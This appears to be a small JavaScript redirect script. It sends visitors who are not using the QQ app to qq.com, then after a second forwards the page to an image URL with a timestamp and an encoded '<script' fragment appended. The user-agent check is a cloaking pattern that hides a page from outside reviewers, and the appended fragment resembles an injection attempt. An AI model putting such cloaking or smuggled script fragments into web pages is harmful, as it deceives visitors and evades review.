function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://res.qxueyou.com/img/2024/01/10/aef5e2612b8b433baf5f14b9fd1c04e2.JPG' + '?' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
